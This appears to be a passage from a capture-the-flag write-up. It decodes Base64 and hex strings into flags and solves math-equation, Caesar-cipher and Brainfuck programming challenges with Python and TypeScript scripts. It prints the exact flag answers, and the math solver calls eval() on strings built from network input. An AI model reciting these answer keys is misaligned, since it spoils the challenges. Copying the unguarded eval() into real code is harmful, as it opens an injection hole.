+[Illustration: Fig. 4.]\</pre><pre class="hljs"><code>[<span class="hljs-attr">Illustration:</span> <span class="hljs-string">Flag.</span> <span class="hljs-number">3</span><span class="hljs-string">.</span>] <span class="hljs-string">ZmxhZy17TDMwbmFyZF9kZV9WMW5jMV9udW1iZXIwMzgyNDYzMDJ9\</span>
+[<span class="hljs-attr">Illustration:</span> <span class="hljs-string">Fig.</span> <span class="hljs-number">4</span><span class="hljs-string">.</span>]<span class="hljs-string">\</span></code></pre></div>
+<p>The text appears to be B64, if we decode with we get the 4th flag: <code class="inline-code">flag-{L30nard_de_V1nc1_number038246302}</code></p>
+<p>At the very end of the file, we also get this string of hex codes:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">66 6c 61 67 2d 7b 4c 33 30 6e 61 72 64 5f 64 65 5f 56 31 6e 63 31 5f 6e 75 6d 62 65 72 30 34 39 38 37 36 35 42 41 7d</pre><pre class="hljs"><code><span class="hljs-number">66</span> <span class="hljs-number">6</span>c <span class="hljs-number">61</span> <span class="hljs-number">67</span> <span class="hljs-number">2</span>d <span class="hljs-number">7</span>b <span class="hljs-number">4</span>c <span class="hljs-number">33</span> <span class="hljs-number">30</span> <span class="hljs-number">6</span>e <span class="hljs-number">61</span> <span class="hljs-number">72</span> <span class="hljs-number">64</span> <span class="hljs-number">5f</span> <span class="hljs-number">64</span> <span class="hljs-number">65</span> <span class="hljs-number">5f</span> <span class="hljs-number">56</span> <span class="hljs-number">31</span> <span class="hljs-number">6</span>e <span class="hljs-number">63</span> <span class="hljs-number">31</span> <span class="hljs-number">5f</span> <span class="hljs-number">6</span>e <span class="hljs-number">75</span> <span class="hljs-number">6</span>d <span class="hljs-number">62</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">30</span> <span class="hljs-number">34</span> <span class="hljs-number">39</span> <span class="hljs-number">38</span> <span class="hljs-number">37</span> <span class="hljs-number">36</span> <span class="hljs-number">35</span> <span class="hljs-number">42</span> <span class="hljs-number">41</span> <span class="hljs-number">7</span>d</code></pre></div>
+<p>If we decode it we get the fifth and final flag: <code class="inline-code">flag-{L30nard_de_V1nc1_number0498765BA}</code></p>
+<h1 id="programming">Programming</h1>
+<h2 id="math-challenge">Math Challenge</h2>
+<p>The challenge is to solve a series of verbal equations and return the answer to all of them within a certain timeframe.</p>
+<p>Example input:</p>
+<p><img src="_resources/8e01be93a58644cf8cafc9b6f9df72ef.png" alt="f004868d84587aaa0bfdd3402e4cbf67.png"></p>
+<p>Each equation would come in one at time through the connections. For this solve, I used a package called <a data-from-md title='https://pypi.org/project/inflect/' href='https://pypi.org/project/inflect/'>Inflect</a> to generate a dictionary of verbal numbers and their corresponding integer:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="python" data-joplin-source-open="```python&#10;" data-joplin-source-close="&#10;```">num_words = {}
+
+for i in range(0, 10000):
+    index = '{0:04}'.format(i)
+    word_form = p.number_to_words(i)
+    word_form = word_form.replace(&quot;,&quot;, &quot;&quot;)
+
+    # Because there are some orthographical mistakes, I need to modify some things
+    
+    
+    # This is because it would for some reason add &quot;zero&quot; if the number's last two integers were 0 (ie.: 5700 would be five thousands zero)
+    if(index[2] == '0' and index[3] == '0'): 
+        word_form += &quot; zero&quot;
+
+    # For example if the number was 570, which is supposed to read five hundred seventy, but if it was 170 it would read one hundred seventy. So it would only change it for plural hundreds... if that makes sense.
+    # So I have to manually change all the inputs to use &quot;hundreds&quot;, if and only if there are many hundreds (Ie: 100 will still be One Hundred)
+    if(index[1] != '1'): 
+        word_form = word_form.replace(&quot;hundred&quot;, &quot;hundreds&quot;)
+
+    if(index[0] != '1'):
+        word_form = word_form.replace(&quot;thousand&quot;, &quot;thousands&quot;)
+
+        # More orthographical mistakes, where 40s would be written as fourty instead of forty...
+    word_form = word_form.replace(&quot;forty&quot;, &quot;fourty&quot;)
+    word_list = word_form.split()
+    remove_list = ['and']
+    tmp = ' '.join([i for i in word_list if i not in remove_list])
+    num_words[tmp] = i</pre><pre class="hljs"><code>num_words = {}
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">10000</span>):
+    index = <span class="hljs-string">&#x27;{0:04}&#x27;</span>.format(i)
+    word_form = p.number_to_words(i)
+    word_form = word_form.replace(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)
+
+    <span class="hljs-comment"># Because there are some orthographical mistakes, I need to modify some things</span>
+    
+    
+    <span class="hljs-comment"># This is because it would for some reason add &quot;zero&quot; if the number&#x27;s last two integers were 0 (ie.: 5700 would be five thousands zero)</span>
+    <span class="hljs-keyword">if</span>(index[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> index[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;0&#x27;</span>): 
+        word_form += <span class="hljs-string">&quot; zero&quot;</span>
+
+    <span class="hljs-comment"># For example if the number was 570, which is supposed to read five hundred seventy, but if it was 170 it would read one hundred seventy. So it would only change it for plural hundreds... if that makes sense.</span>
+    <span class="hljs-comment"># So I have to manually change all the inputs to use &quot;hundreds&quot;, if and only if there are many hundreds (Ie: 100 will still be One Hundred)</span>
+    <span class="hljs-keyword">if</span>(index[<span class="hljs-number">1</span>] != <span class="hljs-string">&#x27;1&#x27;</span>): 
+        word_form = word_form.replace(<span class="hljs-string">&quot;hundred&quot;</span>, <span class="hljs-string">&quot;hundreds&quot;</span>)
+
+    <span class="hljs-keyword">if</span>(index[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;1&#x27;</span>):
+        word_form = word_form.replace(<span class="hljs-string">&quot;thousand&quot;</span>, <span class="hljs-string">&quot;thousands&quot;</span>)
+
+        <span class="hljs-comment"># More orthographical mistakes, where 40s would be written as fourty instead of forty...</span>
+    word_form = word_form.replace(<span class="hljs-string">&quot;forty&quot;</span>, <span class="hljs-string">&quot;fourty&quot;</span>)
+    word_list = word_form.split()
+    remove_list = [<span class="hljs-string">&#x27;and&#x27;</span>]
+    tmp = <span class="hljs-string">&#x27; &#x27;</span>.join([i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> word_list <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> remove_list])
+    num_words[tmp] = i</code></pre></div>
+<p>This would generate a dictionary like this:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="python" data-joplin-source-open="```python&#10;" data-joplin-source-close="&#10;```">{'zero': 0, 'one': 1, 'two': 2, 'three': 3, 'four': 4, 'five': 5, 'six': 6, 'seven': 7, 'eight': 8, 'nine': 9 }
+
+And so on for the next 10000 integers.</pre><pre class="hljs"><code>{<span class="hljs-string">&#x27;zero&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;one&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;two&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;three&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;four&#x27;</span>: <span class="hljs-number">4</span>, <span class="hljs-string">&#x27;five&#x27;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;six&#x27;</span>: <span class="hljs-number">6</span>, <span class="hljs-string">&#x27;seven&#x27;</span>: <span class="hljs-number">7</span>, <span class="hljs-string">&#x27;eight&#x27;</span>: <span class="hljs-number">8</span>, <span class="hljs-string">&#x27;nine&#x27;</span>: <span class="hljs-number">9</span> }
+
+And so on <span class="hljs-keyword">for</span> the next <span class="hljs-number">10000</span> integers.</code></pre></div>
+<p>Onwards, the solve was pretty straight forward: Read the input, parse it to generate an actual equation, eval it, send it, repeat 10 times. It was also mentionned that the output needed to be max 2 decimals.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="python" data-joplin-source-open="```python&#10;" data-joplin-source-close="&#10;```">for i in range(0, 10):
+    # Read the input
+    inpt = r.recv().decode(&quot;utf-8&quot;)
+    inpt.strip()
+    inpt.replace(&quot;\n&quot;,&quot;&quot;)
+    formula = createFormula(inpt.splitlines(True)[2])
+
+    # Dont hardcode, its bad. Im just lazy
+    firstNumber = num_words[formula[0]]
+    secondNumber = num_words[formula[2]]
+    thirdNumber = num_words[formula[4]]
+    firstOperation = operDict.get(formula[1])
+    secondOperation = operDict.get(formula[3])
+
+    evalString = str(firstNumber) + str(firstOperation) + str(secondNumber) + str(secondOperation) + str(thirdNumber)
+    output = eval(evalString)
+    r.sendline(str(&quot;{:.2f}&quot;.format(output))) # Two decimals
+
+print(r.recv())
+r.close()</pre><pre class="hljs"><code><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>):
+    <span class="hljs-comment"># Read the input</span>
+    inpt = r.recv().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)
+    inpt.strip()
+    inpt.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)
+    formula = createFormula(inpt.splitlines(<span class="hljs-literal">True</span>)[<span class="hljs-number">2</span>])
+
+    <span class="hljs-comment"># Dont hardcode, its bad. Im just lazy</span>
+    firstNumber = num_words[formula[<span class="hljs-number">0</span>]]
+    secondNumber = num_words[formula[<span class="hljs-number">2</span>]]
+    thirdNumber = num_words[formula[<span class="hljs-number">4</span>]]
+    firstOperation = operDict.get(formula[<span class="hljs-number">1</span>])
+    secondOperation = operDict.get(formula[<span class="hljs-number">3</span>])
+
+    evalString = str(firstNumber) + str(firstOperation) + str(secondNumber) + str(secondOperation) + str(thirdNumber)
+    output = eval(evalString)
+    r.sendline(str(<span class="hljs-string">&quot;{:.2f}&quot;</span>.format(output))) <span class="hljs-comment"># Two decimals</span>
+
+print(r.recv())
+r.close()</code></pre></div>
+<p>There we go: <code class="inline-code">FLAG-{quick maths, that's pretty good :)_ahGaiR3g}</code> !</p>
+<h2 id="caesar">Caesar</h2>
+<p>Connecting to the socket, we get this message:</p>
+<p><img src="_resources/5cedf7be1fdd4f0d9cb4185f22726efa.png" alt="848fc38bd08696a116af29d368ae6015.png"></p>
+<p>The challenge spec was to solve the message (decode it) and send back the plaintext within a timeframe.</p>
+<p>If we decode the initial string for example:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="shell" data-joplin-source-open="```shell&#10;" data-joplin-source-close="&#10;```">$ echo &quot;TXhmaWhrdCB4bWJndmJ3bmdtIHR3YmlibHZiIHhtYmd2YnduZ20gdGViam50ZiBneGpueCBneGpueC4gLVZ0eGx0aw==&quot; | base64 -d
+$ Mxfihkt xmbgvbwngm twbiblvb xmbgvbwngm tebjntf gxjnx gxjnx. -Vtxltk</pre><pre class="hljs"><code><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;TXhmaWhrdCB4bWJndmJ3bmdtIHR3YmlibHZiIHhtYmd2YnduZ20gdGViam50ZiBneGpueCBneGpueC4gLVZ0eGx0aw==&quot;</span> | base64 -d</span>
+<span class="hljs-meta">$</span><span class="bash"> Mxfihkt xmbgvbwngm twbiblvb xmbgvbwngm tebjntf gxjnx gxjnx. -Vtxltk</span></code></pre></div>
+<p>We see that it's a caesar cipher. Typically, they're ROT13 ciphers, but in this case, it cipher could change.</p>
+<p>For this one, the cipher is rotated 7 times, to give us this string:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">Tempora etincidunt adipisci etincidunt aliquam neque neque. -Caesar</pre><pre class="hljs"><code><span class="hljs-attribute">Tempora</span> etincidunt adipisci etincidunt aliquam neque neque. -Caesar</code></pre></div>
+<p>If we send this one, we get correct output.</p>
+<p>Therefore, since we don't know how many times the string is rotated, but we know that the string must contain the substring<br>
+&quot;-Caesar&quot;, then we simply have to bruteforce the rotation for as long as we don't have a resulting string that contains the needed word:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="typescript" data-joplin-source-open="```typescript&#10;" data-joplin-source-close="&#10;```">let dataArr = [];
+client.on(&quot;data&quot;, (data) =&gt; {
+    let strData = data.toString(&quot;utf-8&quot;);
+    console.log(strData);
+    dataArr.push(strData);
+    if(dataArr.length % 2 === 0) { 
+        let b64decoded = base64.decode(dataArr[0])		// First we Base64 Decode it.
+        let rotdecoded = &quot;&quot;;					// Then set the ROT decoded string to empty
+        for(let i = 0; i &lt; 26; i++) {				// ROT Decode the initial string until we get a substring -Caesar
+            rotdecoded = rot(b64decoded, i);
+            if(rotdecoded.includes(&quot;-Caesar&quot;)) {
+                client.write(rotdecoded);			// Send the decoded ROT string;
+                dataArr = [];		 			// Repeat
+            }
+        }
+    }
+});
+</pre><pre class="hljs"><code><span class="hljs-keyword">let</span> dataArr = [];
+client.on(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
+    <span class="hljs-keyword">let</span> strData = data.toString(<span class="hljs-string">&quot;utf-8&quot;</span>);
+    <span class="hljs-built_in">console</span>.log(strData);
+    dataArr.push(strData);
+    <span class="hljs-keyword">if</span>(dataArr.length % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>) { 
+        <span class="hljs-keyword">let</span> b64decoded = base64.decode(dataArr[<span class="hljs-number">0</span>])		<span class="hljs-comment">// First we Base64 Decode it.</span>
+        <span class="hljs-keyword">let</span> rotdecoded = <span class="hljs-string">&quot;&quot;</span>;					<span class="hljs-comment">// Then set the ROT decoded string to empty</span>
+        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++) {				<span class="hljs-comment">// ROT Decode the initial string until we get a substring -Caesar</span>
+            rotdecoded = rot(b64decoded, i);
+            <span class="hljs-keyword">if</span>(rotdecoded.includes(<span class="hljs-string">&quot;-Caesar&quot;</span>)) {
+                client.write(rotdecoded);			<span class="hljs-comment">// Send the decoded ROT string;</span>
+                dataArr = [];		 			<span class="hljs-comment">// Repeat</span>
+            }
+        }
+    }
+});
+</code></pre></div>
+<p>Executing script, we get:</p>
+<p><img src="_resources/228c837971ae4cb5b13ce903e1b88aa2.png" alt="fa7836a4932f399ad230218f9bd8b588.png"></p>
+<p>There we go: <code class="inline-code"> FLAG-{T3mp0r4_m0r1_t3Mp0r4_muNd15_R3c0rD4}</code> !</p>
+<h2 id="brainfudge">Brainfudge</h2>
+<p>For this challenge, the spec is STDIn will contain an string array of numbers that are in memory. Our job is to change those numbers to represent ascii values of the message <code class="inline-code">&quot;Hello world!&quot;</code></p>
+<p>The catch is that we need to return the code used to do that task, written in <a data-from-md title='https://en.wikipedia.org/wiki/Brainfuck' href='https://en.wikipedia.org/wiki/Brainfuck'>Brainfuck</a>. If you don't know brainfuck, it's not <em>that</em> complicated, you can refer to <a data-from-md title='https://gist.github.com/roachhd/dce54bec8ba55fb17d3a' href='https://gist.github.com/roachhd/dce54bec8ba55fb17d3a'>this gist</a> that explains it pretty well.</p>
+<p>Regardless, the first part of the challenge consists of actually decoding the message that is returned. This can be done easily, since the input is already parsable into an array.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="typescript" data-joplin-source-open="```typescript&#10;" data-joplin-source-close="&#10;```">let dataArr = [];
+client.on(&quot;data&quot;, (data) =&gt; {
+    let strData = data.toString(&quot;utf-8&quot;)
+    console.log(strData);
+    dataArr.push(strData);
+        [...]
+    let codes = JSON.parse(dataArr[0]);
+        [...]</pre><pre class="hljs"><code><span class="hljs-keyword">let</span> dataArr = [];
+client.on(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
+    <span class="hljs-keyword">let</span> strData = data.toString(<span class="hljs-string">&quot;utf-8&quot;</span>)
+    <span class="hljs-built_in">console</span>.log(strData);
+    dataArr.push(strData);
+        [...]
+    <span class="hljs-keyword">let</span> codes = <span class="hljs-built_in">JSON</span>.parse(dataArr[<span class="hljs-number">0</span>]);
+        [...]</code></pre></div>
+<p>We now have an array containing the 12 bytes of memory sent to us. Now we need to compare it with the actual data we want the memory to contain and send it back.</p>
+<p>For that, we know that the resulting memory array is supposed to be an array of charcodes derived from the ascii values of the &quot;Hello world!&quot; string. We can write the ascii codes:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="typescript" data-joplin-source-open="```typescript&#10;" data-joplin-source-close="&#10;```">let helloworldCharCodes: number[] = [];
+let hw = &quot;Hello world!&quot;;
+for (let i = 0; i &lt; hw.length; i++) {
+  helloworldCharCodes.push(hw.charCodeAt(i));
+}</pre><pre class="hljs"><code><span class="hljs-keyword">let</span> helloworldCharCodes: <span class="hljs-built_in">number</span>[] = [];
+<span class="hljs-keyword">let</span> hw = <span class="hljs-string">&quot;Hello world!&quot;</span>;
+<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; hw.length; i++) {
+  helloworldCharCodes.push(hw.charCodeAt(i));
+}</code></pre></div>
+<p>Now all that is left is to convert each code into the respective number and print it.</p>
+<p>In short, we can increase a value in brainfuck using the &quot;+&quot; character, decrease it using the &quot;-&quot; character and moveover or moveback using the &quot;&gt;&quot; and &quot;&lt;&quot; characters respectively. Finally, we can also print the current memory block using the &quot;.&quot; character.</p>
+<p>Our goal is to generate the brainfuck code that will allow us to increase or decrease each memory block until we reach the same ascii value as the one for each character of the &quot;Hello world!&quot; string, then print the memory block's output to stdout and moveover to the next one. For each memory block, we will append the resulting brainfuck code. Great, now that we know the algorithm, here's the code:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="typescript" data-joplin-source-open="```typescript&#10;" data-joplin-source-close="&#10;```">let bfCode = &quot;&quot;;
+    codes.forEach((code, index) =&gt; {
+      let tmp = &quot;&quot;;
+      while (code != helloworldCharCodes[index]) {
+        if (code &lt; helloworldCharCodes[index]) {
+          tmp += &quot;+&quot;;
+          code++;
+        } else if (code &gt; helloworldCharCodes[index]) {
+          tmp += &quot;-&quot;;
+          code--;
+        }
+      }
+      if(index != helloworldCharCodes.length - 1) {
+        tmp += &quot;.&gt;&quot;
+      } else tmp += &quot;.&quot;
+      bfCode += tmp;
+    });</pre><pre class="hljs"><code><span class="hljs-keyword">let</span> bfCode = <span class="hljs-string">&quot;&quot;</span>;
+    codes.forEach(<span class="hljs-function">(<span class="hljs-params">code, index</span>) =&gt;</span> {
+      <span class="hljs-keyword">let</span> tmp = <span class="hljs-string">&quot;&quot;</span>;
+      <span class="hljs-keyword">while</span> (code != helloworldCharCodes[index]) {
+        <span class="hljs-keyword">if</span> (code &lt; helloworldCharCodes[index]) {
+          tmp += <span class="hljs-string">&quot;+&quot;</span>;
+          code++;
+        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (code &gt; helloworldCharCodes[index]) {
+          tmp += <span class="hljs-string">&quot;-&quot;</span>;
+          code--;
+        }
+      }
+      <span class="hljs-keyword">if</span>(index != helloworldCharCodes.length - <span class="hljs-number">1</span>) {
+        tmp += <span class="hljs-string">&quot;.&gt;&quot;</span>
+      } <span class="hljs-keyword">else</span> tmp += <span class="hljs-string">&quot;.&quot;</span>
+      bfCode += tmp;
+    });</code></pre></div>
+<p>And thats about it! Here's the output:</p>
+<p><img src="_resources/15e39efbafa6487fbe24bdb17447e8a2.png" alt="54a01f20a02d7225b78a8844d70d32ed.png"></p>
+<p>As you can see, the code is long, but it's all on one line to respect the challenge spec.</p>
+<p>Here we go: <code class="inline-code">FLAG-{TH3_B35T_PR0GR4MM1NG_L4NGU4G3_EV3R_M4D3}</code></p>
+</div></div>
+					</body>
+				</html>
+			
